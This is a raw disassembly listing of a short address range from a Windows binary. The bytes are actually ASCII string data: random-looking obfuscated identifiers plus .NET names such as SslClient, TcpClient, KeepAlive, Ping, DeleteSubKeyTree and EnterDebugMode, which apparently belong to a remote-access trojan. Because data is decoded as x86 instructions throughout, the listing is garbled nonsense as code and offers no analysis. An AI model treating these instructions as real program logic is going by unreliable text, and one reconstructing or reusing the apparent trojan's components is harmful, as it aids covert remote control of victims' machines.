  4080b3:	77 49                	ja     0x4080fe
  4080b5:	47                   	inc    %edi
  4080b6:	4d                   	dec    %ebp
  4080b7:	75 58                	jne    0x408111
  4080b9:	00 65 61             	add    %ah,0x61(%ebp)
  4080bc:	64 75 52             	fs jne 0x408111
  4080bf:	49                   	dec    %ecx
  4080c0:	47                   	inc    %edi
  4080c1:	4a                   	dec    %edx
  4080c2:	54                   	push   %esp
  4080c3:	42                   	inc    %edx
  4080c4:	73 56                	jae    0x40811c
  4080c6:	5a                   	pop    %edx
  4080c7:	6e                   	outsb  %ds:(%esi),(%dx)
  4080c8:	44                   	inc    %esp
  4080c9:	59                   	pop    %ecx
  4080ca:	00 66 68             	add    %ah,0x68(%esi)
  4080cd:	73 6f                	jae    0x40813e
  4080cf:	70 4f                	jo     0x408120
  4080d1:	53                   	push   %ebx
  4080d2:	53                   	push   %ebx
  4080d3:	74 68                	je     0x40813d
  4080d5:	49                   	dec    %ecx
  4080d6:	53                   	push   %ebx
  4080d7:	4d                   	dec    %ebp
  4080d8:	59                   	pop    %ecx
  4080d9:	00 70 4f             	add    %dh,0x4f(%eax)
  4080dc:	74 6f                	je     0x40814d
  4080de:	44                   	inc    %esp
  4080df:	78 6b                	js     0x40814c
  4080e1:	4e                   	dec    %esi
  4080e2:	52                   	push   %edx
  4080e3:	59                   	pop    %ecx
  4080e4:	00 7a 63             	add    %bh,0x63(%edx)
  4080e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4080e8:	66 6d                	insw   (%dx),%es:(%edi)
  4080ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4080eb:	54                   	push   %esp
  4080ec:	4e                   	dec    %esi
  4080ed:	5a                   	pop    %edx
  4080ee:	66 59                	pop    %cx
  4080f0:	00 43 66             	add    %al,0x66(%ebx)
  4080f3:	45                   	inc    %ebp
  4080f4:	59                   	pop    %ecx
  4080f5:	78 52                	js     0x408149
  4080f7:	66 57                	push   %di
  4080f9:	77 59                	ja     0x408154
  4080fb:	51                   	push   %ecx
  4080fc:	50                   	push   %eax
  4080fd:	72 6e                	jb     0x40816d
  4080ff:	59                   	pop    %ecx
  408100:	00 4a 61             	add    %cl,0x61(%edx)
  408103:	70 58                	jo     0x40815d
  408105:	6b 62 62 66          	imul   $0x66,0x62(%edx),%esp
  408109:	61                   	popa
  40810a:	76 6f                	jbe    0x40817b
  40810c:	59                   	pop    %ecx
  40810d:	00 51 6e             	add    %dl,0x6e(%ecx)
  408110:	56                   	push   %esi
  408111:	65 66 6e             	data16 outsb %gs:(%esi),(%dx)
  408114:	56                   	push   %esi
  408115:	79 61                	jns    0x408178
  408117:	45                   	inc    %ebp
  408118:	78 4d                	js     0x408167
  40811a:	42                   	inc    %edx
  40811b:	7a 6f                	jp     0x40818c
  40811d:	59                   	pop    %ecx
  40811e:	00 6e 7a             	add    %ch,0x7a(%esi)
  408121:	58                   	pop    %eax
  408122:	68 56 6b 77 58       	push   $0x58776b56
  408127:	45                   	inc    %ebp
  408128:	7a 59                	jp     0x408183
  40812a:	00 44 73 4d          	add    %al,0x4d(%ebx,%esi,2)
  40812e:	74 6d                	je     0x40819d
  408130:	6d                   	insl   (%dx),%es:(%edi)
  408131:	6a 5a                	push   $0x5a
  408133:	72 43                	jb     0x408178
  408135:	5a                   	pop    %edx
  408136:	00 42 73             	add    %al,0x73(%edx)
  408139:	59                   	pop    %ecx
  40813a:	50                   	push   %eax
  40813b:	64 66 5a             	fs pop %dx
  40813e:	50                   	push   %eax
  40813f:	46                   	inc    %esi
  408140:	4a                   	dec    %edx
  408141:	5a                   	pop    %edx
  408142:	00 6d 6d             	add    %ch,0x6d(%ebp)
  408145:	68 67 6d 6f 6f       	push   $0x6f6f6d67
  40814a:	62 58 49             	bound  %ebx,0x49(%eax)
  40814d:	78 4e                	js     0x40819d
  40814f:	5a                   	pop    %edx
  408150:	00 55 48             	add    %dl,0x48(%ebp)
  408153:	75 68                	jne    0x4081bd
  408155:	51                   	push   %ecx
  408156:	49                   	dec    %ecx
  408157:	66 53                	push   %bx
  408159:	6c                   	insb   (%dx),%es:(%edi)
  40815a:	6f                   	outsl  %ds:(%esi),(%dx)
  40815b:	4f                   	dec    %edi
  40815c:	5a                   	pop    %edx
  40815d:	00 66 53             	add    %ah,0x53(%esi)
  408160:	69 75 43 74 6a 63 43 	imul   $0x43636a74,0x43(%ebp),%esi
  408167:	50                   	push   %eax
  408168:	61                   	popa
  408169:	65 62 57 5a          	bound  %edx,%gs:0x5a(%edi)
  40816d:	00 76 61             	add    %dh,0x61(%esi)
  408170:	6c                   	insb   (%dx),%es:(%edi)
  408171:	75 65                	jne    0x4081d8
  408173:	5f                   	pop    %edi
  408174:	5f                   	pop    %edi
  408175:	00 43 4a             	add    %al,0x4a(%ebx)
  408178:	5a                   	pop    %edx
  408179:	68 44 62 65 5a       	push   $0x5a656244
  40817e:	79 4c                	jns    0x4081cc
  408180:	61                   	popa
  408181:	00 63 66             	add    %ah,0x66(%ebx)
  408184:	69 74 54 55 63 6e 46 	imul   $0x57466e63,0x55(%esp,%edx,2),%esi
  40818b:	57 
  40818c:	50                   	push   %eax
  40818d:	4e                   	dec    %esi
  40818e:	61                   	popa
  40818f:	00 52 54             	add    %dl,0x54(%edx)
  408192:	6a 65                	push   $0x65
  408194:	52                   	push   %edx
  408195:	55                   	push   %ebp
  408196:	45                   	inc    %ebp
  408197:	73 59                	jae    0x4081f2
  408199:	55                   	push   %ebp
  40819a:	51                   	push   %ecx
  40819b:	61                   	popa
  40819c:	00 54 6b 49          	add    %dl,0x49(%ebx,%ebp,2)
  4081a0:	77 59                	ja     0x4081fb
  4081a2:	6c                   	insb   (%dx),%es:(%edi)
  4081a3:	76 6a                	jbe    0x40820f
  4081a5:	71 70                	jno    0x408217
  4081a7:	4c                   	dec    %esp
  4081a8:	57                   	push   %edi
  4081a9:	61                   	popa
  4081aa:	00 56 47             	add    %dl,0x47(%esi)
  4081ad:	7a 46                	jp     0x4081f5
  4081af:	75 71                	jne    0x408222
  4081b1:	4e                   	dec    %esi
  4081b2:	47                   	inc    %edi
  4081b3:	47                   	inc    %edi
  4081b4:	5a                   	pop    %edx
  4081b5:	6a 58                	push   $0x58
  4081b7:	61                   	popa
  4081b8:	00 74 6c 61          	add    %dh,0x61(%esp,%ebp,2)
  4081bc:	44                   	inc    %esp
  4081bd:	6b 55 76 49          	imul   $0x49,0x76(%ebp),%edx
  4081c1:	46                   	inc    %esi
  4081c2:	71 58                	jno    0x40821c
  4081c4:	69 61 00 64 6f 78 61 	imul   $0x61786f64,0x0(%ecx),%esp
  4081cb:	74 6a                	je     0x408237
  4081cd:	4a                   	dec    %edx
  4081ce:	7a 66                	jp     0x408236
  4081d0:	68 6e 61 00 4b       	push   $0x4b00616e
  4081d5:	63 6e 73             	arpl   %ebp,0x73(%esi)
  4081d8:	73 54                	jae    0x40822e
  4081da:	4c                   	dec    %esp
  4081db:	47                   	inc    %edi
  4081dc:	4d                   	dec    %ebp
  4081dd:	6d                   	insl   (%dx),%es:(%edi)
  4081de:	70 61                	jo     0x408241
  4081e0:	00 47 52             	add    %al,0x52(%edi)
  4081e3:	4c                   	dec    %esp
  4081e4:	78 67                	js     0x40824d
  4081e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4081e7:	6c                   	insb   (%dx),%es:(%edi)
  4081e8:	65 6a 6a             	gs push $0x6a
  4081eb:	48                   	dec    %eax
  4081ec:	50                   	push   %eax
  4081ed:	54                   	push   %esp
  4081ee:	43                   	inc    %ebx
  4081ef:	62 00                	bound  %eax,(%eax)
  4081f1:	48                   	dec    %eax
  4081f2:	78 72                	js     0x408266
  4081f4:	62 4d 79             	bound  %ecx,0x79(%ebp)
  4081f7:	43                   	inc    %ebx
  4081f8:	47                   	inc    %edi
  4081f9:	65 71 76             	gs jno 0x408272
  4081fc:	46                   	inc    %esi
  4081fd:	6a 6c                	push   $0x6c
  4081ff:	4b                   	dec    %ebx
  408200:	62 00                	bound  %eax,(%eax)
  408202:	51                   	push   %ecx
  408203:	5a                   	pop    %edx
  408204:	6b 5a 76 6e          	imul   $0x6e,0x76(%edx),%ebx
  408208:	76 75                	jbe    0x40827f
  40820a:	5a                   	pop    %edx
  40820b:	67 6a 4d             	addr16 push $0x4d
  40820e:	62 00                	bound  %eax,(%eax)
  408210:	62 6d 41             	bound  %ebp,0x41(%ebp)
  408213:	50                   	push   %eax
  408214:	4b                   	dec    %ebx
  408215:	66 52                	push   %dx
  408217:	7a 76                	jp     0x40828f
  408219:	68 66 67 51 62       	push   $0x62516766
  40821e:	00 4a 6b             	add    %cl,0x6b(%edx)
  408221:	4b                   	dec    %ebx
  408222:	65 6b 52 79 74       	imul   $0x74,%gs:0x79(%edx),%edx
  408227:	4b                   	dec    %ebx
  408228:	55                   	push   %ebp
  408229:	62 00                	bound  %eax,(%eax)
  40822b:	6d                   	insl   (%dx),%es:(%edi)
  40822c:	73 63                	jae    0x408291
  40822e:	6f                   	outsl  %ds:(%esi),(%dx)
  40822f:	72 6c                	jb     0x40829d
  408231:	69 62 00 45 45 70 4c 	imul   $0x4c704545,0x0(%edx),%esp
  408238:	5a                   	pop    %edx
  408239:	68 49 4d 50 48       	push   $0x48504d49
  40823e:	63 00                	arpl   %eax,(%eax)
  408240:	66 6c                	data16 insb (%dx),%es:(%edi)
  408242:	53                   	push   %ebx
  408243:	52                   	push   %edx
  408244:	45                   	inc    %ebp
  408245:	64 75 61             	fs jne 0x4082a9
  408248:	6f                   	outsl  %ds:(%esi),(%dx)
  408249:	56                   	push   %esi
  40824a:	77 4c                	ja     0x408298
  40824c:	63 00                	arpl   %eax,(%eax)
  40824e:	6d                   	insl   (%dx),%es:(%edi)
  40824f:	73 76                	jae    0x4082c7
  408251:	42                   	inc    %edx
  408252:	4c                   	dec    %esp
  408253:	68 43 6d 4a 63       	push   $0x634a6d43
  408258:	6a 68                	push   $0x68
  40825a:	68 51 55 63 00       	push   $0x635551
  40825f:	4c                   	dec    %esp
  408260:	6f                   	outsl  %ds:(%esi),(%dx)
  408261:	6b 58 62 66          	imul   $0x66,0x62(%eax),%ebx
  408265:	48                   	dec    %eax
  408266:	73 61                	jae    0x4082c9
  408268:	63 00                	arpl   %eax,(%eax)
  40826a:	70 73                	jo     0x4082df
  40826c:	65 68 46 52 55 4b    	gs push $0x4b555246
  408272:	67 69 63 00 53 79 73 	imul   $0x74737953,0x0(%bp,%di),%esp
  408279:	74 
  40827a:	65 6d                	gs insl (%dx),%es:(%edi)
  40827c:	2e 43                	cs inc %ebx
  40827e:	6f                   	outsl  %ds:(%esi),(%dx)
  40827f:	6c                   	insb   (%dx),%es:(%edi)
  408280:	6c                   	insb   (%dx),%es:(%edi)
  408281:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408286:	6e                   	outsb  %ds:(%esi),(%dx)
  408287:	73 2e                	jae    0x4082b7
  408289:	47                   	inc    %edi
  40828a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40828c:	65 72 69             	gs jb  0x4082f8
  40828f:	63 00                	arpl   %eax,(%eax)
  408291:	4d                   	dec    %ebp
  408292:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408299:	74 2e                	je     0x4082c9
  40829b:	56                   	push   %esi
  40829c:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4082a3:	73 69                	jae    0x40830e
  4082a5:	63 00                	arpl   %eax,(%eax)
  4082a7:	67 65 74 5f          	addr16 gs je 0x40830a
  4082ab:	53                   	push   %ebx
  4082ac:	65 6e                	outsb  %gs:(%esi),(%dx)
  4082ae:	64 53                	fs push %ebx
  4082b0:	79 6e                	jns    0x408320
  4082b2:	63 00                	arpl   %eax,(%eax)
  4082b4:	4e                   	dec    %esi
  4082b5:	4f                   	dec    %edi
  4082b6:	65 6b 47 45 49       	imul   $0x49,%gs:0x45(%edi),%eax
  4082bb:	68 65 4c 43 64       	push   $0x64434c65
  4082c0:	00 49 71             	add    %cl,0x71(%ecx)
  4082c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4082c4:	45                   	inc    %ebp
  4082c5:	49                   	dec    %ecx
  4082c6:	64 71 77             	fs jno 0x408340
  4082c9:	6d                   	insl   (%dx),%es:(%edi)
  4082ca:	66 49                	dec    %cx
  4082cc:	44                   	inc    %esp
  4082cd:	64 00 68 53          	add    %ch,%fs:0x53(%eax)
  4082d1:	46                   	inc    %esi
  4082d2:	64 61                	fs popa
  4082d4:	5a                   	pop    %edx
  4082d5:	48                   	dec    %eax
  4082d6:	4a                   	dec    %edx
  4082d7:	62 54 6b 4b          	bound  %edx,0x4b(%ebx,%ebp,2)
  4082db:	64 00 65 47          	add    %ah,%fs:0x47(%ebp)
  4082df:	71 6b                	jno    0x40834c
  4082e1:	73 62                	jae    0x408345
  4082e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4082e4:	61                   	popa
  4082e5:	75 58                	jne    0x40833f
  4082e7:	42                   	inc    %edx
  4082e8:	4e                   	dec    %esi
  4082e9:	64 00 73 44          	add    %dh,%fs:0x44(%ebx)
  4082ed:	70 67                	jo     0x408356
  4082ef:	57                   	push   %edi
  4082f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4082f1:	66 62 66 6f          	bound  %sp,0x6f(%esi)
  4082f5:	42                   	inc    %edx
  4082f6:	56                   	push   %esi
  4082f7:	64 00 55 69          	add    %dl,%fs:0x69(%ebp)
  4082fb:	4c                   	dec    %esp
  4082fc:	56                   	push   %esi
  4082fd:	61                   	popa
  4082fe:	4d                   	dec    %ebp
  4082ff:	63 64 4d 6d          	arpl   %esp,0x6d(%ebp,%ecx,2)
  408303:	57                   	push   %edi
  408304:	64 00 6d 67          	add    %ch,%fs:0x67(%ebp)
  408308:	6b 63 63 65          	imul   $0x65,0x63(%ebx),%esp
  40830c:	50                   	push   %eax
  40830d:	4c                   	dec    %esp
  40830e:	58                   	pop    %eax
  40830f:	64 00 45 6e          	add    %al,%fs:0x6e(%ebp)
  408313:	64 52                	fs push %edx
  408315:	65 61                	gs popa
  408317:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  40831b:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  408322:	00 
  408323:	54                   	push   %esp
  408324:	68 72 65 61 64       	push   $0x64616572
  408329:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  40832d:	64 00 64 77 43       	add    %ah,%fs:0x43(%edi,%esi,2)
  408332:	70 59                	jo     0x40838d
  408334:	4d                   	dec    %ebp
  408335:	6b 77 6e 72          	imul   $0x72,0x6e(%edi),%esi
  408339:	61                   	popa
  40833a:	78 63                	js     0x40839f
  40833c:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  408340:	64 00 76 56          	add    %dh,%fs:0x56(%esi)
  408344:	6e                   	outsb  %ds:(%esi),(%dx)
  408345:	41                   	inc    %ecx
  408346:	63 4e 64             	arpl   %ecx,0x64(%esi)
  408349:	71 79                	jno    0x4083c4
  40834b:	64 64 00 51 6e       	fs add %dl,%fs:0x6e(%ecx)
  408350:	77 73                	ja     0x4083c5
  408352:	62 50 54             	bound  %edx,0x54(%eax)
  408355:	75 6b                	jne    0x4083c2
  408357:	63 65 64             	arpl   %esp,0x64(%ebp)
  40835a:	00 53 48             	add    %dl,0x48(%ebx)
  40835d:	41                   	inc    %ecx
  40835e:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  408364:	61                   	popa
  408365:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  40836b:	74 5f                	je     0x4083cc
  40836d:	43                   	inc    %ebx
  40836e:	6f                   	outsl  %ds:(%esi),(%dx)
  40836f:	6e                   	outsb  %ds:(%esi),(%dx)
  408370:	6e                   	outsb  %ds:(%esi),(%dx)
  408371:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  408376:	00 67 65             	add    %ah,0x65(%edi)
  408379:	74 5f                	je     0x4083da
  40837b:	49                   	dec    %ecx
  40837c:	73 43                	jae    0x4083c1
  40837e:	6f                   	outsl  %ds:(%esi),(%dx)
  40837f:	6e                   	outsb  %ds:(%esi),(%dx)
  408380:	6e                   	outsb  %ds:(%esi),(%dx)
  408381:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  408386:	00 73 65             	add    %dh,0x65(%ebx)
  408389:	74 5f                	je     0x4083ea
  40838b:	49                   	dec    %ecx
  40838c:	73 43                	jae    0x4083d1
  40838e:	6f                   	outsl  %ds:(%esi),(%dx)
  40838f:	6e                   	outsb  %ds:(%esi),(%dx)
  408390:	6e                   	outsb  %ds:(%esi),(%dx)
  408391:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  408396:	00 67 65             	add    %ah,0x65(%edi)
  408399:	74 5f                	je     0x4083fa
  40839b:	47                   	inc    %edi
  40839c:	75 69                	jne    0x408407
  40839e:	64 00 3c 53          	add    %bh,%fs:(%ebx,%edx,2)
  4083a2:	65 6e                	outsb  %gs:(%esi),(%dx)
  4083a4:	64 53                	fs push %ebx
  4083a6:	79 6e                	jns    0x408416
  4083a8:	63 3e                	arpl   %edi,(%esi)
  4083aa:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  4083ae:	61                   	popa
  4083af:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4083b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4083b3:	67 46                	addr16 inc %esi
  4083b5:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  4083bc:	73 43                	jae    0x408401
  4083be:	6f                   	outsl  %ds:(%esi),(%dx)
  4083bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4083c0:	6e                   	outsb  %ds:(%esi),(%dx)
  4083c1:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  4083c6:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  4083cb:	61                   	popa
  4083cc:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4083cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4083d0:	67 46                	addr16 inc %esi
  4083d2:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  4083d9:	65 65 70 41          	gs gs jo 0x40841e
  4083dd:	6c                   	insb   (%dx),%es:(%edi)
  4083de:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  4083e5:	42                   	inc    %edx
  4083e6:	61                   	popa
  4083e7:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4083ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4083eb:	67 46                	addr16 inc %esi
  4083ed:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  4083f4:	65 61                	gs popa
  4083f6:	64 65 72 53          	fs gs jb 0x40844d
  4083fa:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  408401:	42                   	inc    %edx
  408402:	61                   	popa
  408403:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408406:	6e                   	outsb  %ds:(%esi),(%dx)
  408407:	67 46                	addr16 inc %esi
  408409:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  408410:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  408417:	42                   	inc    %edx
  408418:	61                   	popa
  408419:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40841c:	6e                   	outsb  %ds:(%esi),(%dx)
  40841d:	67 46                	addr16 inc %esi
  40841f:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  408426:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40842a:	61                   	popa
  40842b:	74 65                	je     0x408492
  40842d:	50                   	push   %eax
  40842e:	6f                   	outsl  %ds:(%esi),(%dx)
  40842f:	6e                   	outsb  %ds:(%esi),(%dx)
  408430:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  408436:	61                   	popa
  408437:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40843a:	6e                   	outsb  %ds:(%esi),(%dx)
  40843b:	67 46                	addr16 inc %esi
  40843d:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  408444:	6e                   	outsb  %ds:(%esi),(%dx)
  408445:	74 65                	je     0x4084ac
  408447:	72 76                	jb     0x4084bf
  408449:	61                   	popa
  40844a:	6c                   	insb   (%dx),%es:(%edi)
  40844b:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  408450:	61                   	popa
  408451:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408454:	6e                   	outsb  %ds:(%esi),(%dx)
  408455:	67 46                	addr16 inc %esi
  408457:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  40845e:	75 66                	jne    0x4084c6
  408460:	66 65 72 3e          	data16 gs jb 0x4084a2
  408464:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  408468:	61                   	popa
  408469:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40846c:	6e                   	outsb  %ds:(%esi),(%dx)
  40846d:	67 46                	addr16 inc %esi
  40846f:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  408476:	66 66 73 65          	data16 data16 jae 0x4084df
  40847a:	74 3e                	je     0x4084ba
  40847c:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  408480:	61                   	popa
  408481:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408484:	6e                   	outsb  %ds:(%esi),(%dx)
  408485:	67 46                	addr16 inc %esi
  408487:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  40848e:	73 6c                	jae    0x4084fc
  408490:	43                   	inc    %ebx
  408491:	6c                   	insb   (%dx),%es:(%edi)
  408492:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  408499:	5f                   	pop    %edi
  40849a:	42                   	inc    %edx
  40849b:	61                   	popa
  40849c:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40849f:	6e                   	outsb  %ds:(%esi),(%dx)
  4084a0:	67 46                	addr16 inc %esi
  4084a2:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  4084a9:	63 70 43             	arpl   %esi,0x43(%eax)
  4084ac:	6c                   	insb   (%dx),%es:(%edi)
  4084ad:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  4084b4:	5f                   	pop    %edi
  4084b5:	42                   	inc    %edx
  4084b6:	61                   	popa
  4084b7:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4084ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4084bb:	67 46                	addr16 inc %esi
  4084bd:	69 65 6c 64 00 41 70 	imul   $0x70410064,0x6c(%ebp),%esp
  4084c4:	70 65                	jo     0x40852b
  4084c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4084c7:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  4084cb:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  4084d2:	61 
  4084d3:	6c                   	insb   (%dx),%es:(%edi)
  4084d4:	75 65                	jne    0x40853b
  4084d6:	4b                   	dec    %ebx
  4084d7:	69 6e 64 00 58 59 51 	imul   $0x51595800,0x64(%esi),%ebp
  4084de:	72 6c                	jb     0x40854c
  4084e0:	74 69                	je     0x40854b
  4084e2:	6a 47                	push   $0x47
  4084e4:	65 00 69 44          	add    %ch,%gs:0x44(%ecx)
  4084e8:	47                   	inc    %edi
  4084e9:	5a                   	pop    %edx
  4084ea:	42                   	inc    %edx
  4084eb:	42                   	inc    %edx
  4084ec:	76 41                	jbe    0x40852f
  4084ee:	41                   	inc    %ecx
  4084ef:	49                   	dec    %ecx
  4084f0:	56                   	push   %esi
  4084f1:	65 00 51 50          	add    %dl,%gs:0x50(%ecx)
  4084f5:	61                   	popa
  4084f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4084f7:	58                   	pop    %eax
  4084f8:	70 74                	jo     0x40856e
  4084fa:	6d                   	insl   (%dx),%es:(%edi)
  4084fb:	62 62 65             	bound  %esp,0x65(%edx)
  4084fe:	00 52 65             	add    %dl,0x65(%edx)
  408501:	70 6c                	jo     0x40856f
  408503:	61                   	popa
  408504:	63 65 00             	arpl   %esp,0x0(%ebp)
  408507:	43                   	inc    %ebx
  408508:	72 65                	jb     0x40856f
  40850a:	61                   	popa
  40850b:	74 65                	je     0x408572
  40850d:	49                   	dec    %ecx
  40850e:	6e                   	outsb  %ds:(%esi),(%dx)
  40850f:	73 74                	jae    0x408585
  408511:	61                   	popa
  408512:	6e                   	outsb  %ds:(%esi),(%dx)
  408513:	63 65 00             	arpl   %esp,0x0(%ebp)
  408516:	53                   	push   %ebx
  408517:	6e                   	outsb  %ds:(%esi),(%dx)
  408518:	71 4d                	jno    0x408567
  40851a:	76 58                	jbe    0x408574
  40851c:	6d                   	insl   (%dx),%es:(%edi)
  40851d:	59                   	pop    %ecx
  40851e:	4b                   	dec    %ebx
  40851f:	4c                   	dec    %esp
  408520:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  408525:	74 5f                	je     0x408586
  408527:	4d                   	dec    %ebp
  408528:	6f                   	outsl  %ds:(%esi),(%dx)
  408529:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  40852e:	6c                   	insb   (%dx),%es:(%edi)
  40852f:	65 4d                	gs dec %ebp
  408531:	6f                   	outsl  %ds:(%esi),(%dx)
  408532:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  408537:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  40853e:	64 65 
  408540:	00 45 6e             	add    %al,0x6e(%ebp)
  408543:	74 65                	je     0x4085aa
  408545:	72 44                	jb     0x40858b
  408547:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40854b:	4d                   	dec    %ebp
  40854c:	6f                   	outsl  %ds:(%esi),(%dx)
  40854d:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  408552:	79 70                	jns    0x4085c4
  408554:	74 6f                	je     0x4085c5
  408556:	53                   	push   %ebx
  408557:	74 72                	je     0x4085cb
  408559:	65 61                	gs popa
  40855b:	6d                   	insl   (%dx),%es:(%edi)
  40855c:	4d                   	dec    %ebp
  40855d:	6f                   	outsl  %ds:(%esi),(%dx)
  40855e:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  408563:	6d                   	insl   (%dx),%es:(%edi)
  408564:	70 72                	jo     0x4085d8
  408566:	65 73 73             	gs jae 0x4085dc
  408569:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  408570:	00 43 69             	add    %al,0x69(%ebx)
  408573:	70 68                	jo     0x4085dd
  408575:	65 72 4d             	gs jb  0x4085c5
  408578:	6f                   	outsl  %ds:(%esi),(%dx)
  408579:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  40857e:	6c                   	insb   (%dx),%es:(%edi)
  40857f:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  408584:	64 65 00 44 65 6c    	fs add %al,%gs:0x6c(%ebp,%eiz,2)
  40858a:	65 74 65             	gs je  0x4085f2
  40858d:	53                   	push   %ebx
  40858e:	75 62                	jne    0x4085f2
  408590:	4b                   	dec    %ebx
  408591:	65 79 54             	gs jns 0x4085e8
  408594:	72 65                	jb     0x4085fb
  408596:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40859a:	74 5f                	je     0x4085fb
  40859c:	4d                   	dec    %ebp
  40859d:	65 73 73             	gs jae 0x408613
  4085a0:	61                   	popa
  4085a1:	67 65 00 5a 51       	add    %bl,%gs:0x51(%bp,%si)
  4085a6:	4d                   	dec    %ebp
  4085a7:	68 75 4c 79 55       	push   $0x55794c75
  4085ac:	68 65 00 49 6e       	push   $0x6e490065
  4085b1:	76 6f                	jbe    0x408622
  4085b3:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  4085b7:	45                   	inc    %ebp
  4085b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4085b9:	75 6d                	jne    0x408628
  4085bb:	65 72 61             	gs jb  0x40861f
  4085be:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  4085c2:	49                   	dec    %ecx
  4085c3:	44                   	inc    %esp
  4085c4:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  4085cb:	6c                   	insb   (%dx),%es:(%edi)
  4085cc:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  4085d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4085d2:	75 62                	jne    0x408636
  4085d4:	6c                   	insb   (%dx),%es:(%edi)
  4085d5:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4085d9:	74 5f                	je     0x40863a
  4085db:	48                   	dec    %eax
  4085dc:	61                   	popa
  4085dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4085de:	64 6c                	fs insb (%dx),%es:(%edi)
  4085e0:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4085e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4085e5:	74 69                	je     0x408650
  4085e7:	6d                   	insl   (%dx),%es:(%edi)
  4085e8:	65 46                	gs inc %esi
